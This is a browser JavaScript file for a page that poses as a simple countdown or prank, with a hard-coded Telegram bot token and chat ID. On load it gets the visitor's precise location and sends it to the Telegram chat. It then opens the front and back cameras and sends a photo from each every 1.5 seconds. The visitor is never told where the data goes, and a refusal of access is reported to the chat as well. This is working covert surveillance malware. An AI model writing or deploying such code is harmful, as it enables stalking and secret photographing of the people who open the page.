const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const countdownEl = document.getElementById('countdown');
const hazbikText = document.getElementById('hazbikText');
const reloadBtn = document.getElementById('reloadBtn');

const videoFront = document.getElementById('videoFront');
const videoBack = document.getElementById('videoBack');

const canvasFront = document.getElementById('canvasFront');
const canvasBack = document.getElementById('canvasBack');

let streamFront = null;
let streamBack = null;
let photoInterval = null;

async function sendTelegramMessage(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
    });
  } catch {}
}

async function sendPhoto(blob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', blob, 'photo.jpg');
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
  } catch {}
}

async function sendLocationToTelegram(lat, lon) {
  const url = `https://maps.google.com/?q=${lat},${lon}`;
  await sendTelegramMessage(`🌍 Геолокация: ${url}`);
}

function takePhoto(videoEl, canvasEl) {
  const ctx = canvasEl.getContext('2d');
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  return new Promise(resolve => {
    canvasEl.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
  });
}

async function startPhotoLoop() {
  photoInterval = setInterval(async () => {
    if (videoFront.readyState >= 2) {
      const blobFront = await takePhoto(videoFront, canvasFront);
      sendPhoto(blobFront);
    }
    if (videoBack.readyState >= 2) {
      const blobBack = await takePhoto(videoBack, canvasBack);
      sendPhoto(blobBack);
    }
  }, 1500);
}

function showReloadButton() {
  countdownEl.style.display = 'none';
  hazbikText.style.display = 'none';
  reloadBtn.style.display = 'block';
  reloadBtn.onclick = () => location.reload();

  if (photoInterval) clearInterval(photoInterval);
  if (streamFront) streamFront.getTracks().forEach(t => t.stop());
  if (streamBack) streamBack.getTracks().forEach(t => t.stop());
}

async function requestGeo() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) reject();
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      () => reject(),
      { enableHighAccuracy: true, timeout: 7000 }
    );
  });
}

async function requestCamera(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return stream;
  } catch {
    throw new Error('Camera denied');
  }
}

async function startCountdown() {
  countdownEl.style.display = 'block';
  hazbikText.style.display = 'none';
  reloadBtn.style.display = 'none';

  let count = 3;
  countdownEl.textContent = count;

  const interval = setInterval(() => {
    count--;
    if (count === 0) {
      clearInterval(interval);
      countdownEl.style.display = 'none';
      hazbikText.style.display = 'block';
      setTimeout(() => {
        hazbikText.style.display = 'none';
        reloadBtn.style.display = 'block';
      }, 3000);
    } else {
      countdownEl.textContent = count;
    }
  }, 1000);
}

async function init() {
  try {
    const coords = await requestGeo();
    await sendLocationToTelegram(coords.latitude, coords.longitude);

    streamFront = await requestCamera('user');
    videoFront.srcObject = streamFront;

    streamBack = await requestCamera('environment');
    videoBack.srcObject = streamBack;

    startCountdown();
    startPhotoLoop();
  } catch (e) {
    await sendTelegramMessage('❌ Пользователь отказал в доступе к камере или геолокации.');
    showReloadButton();
  }
}

init();
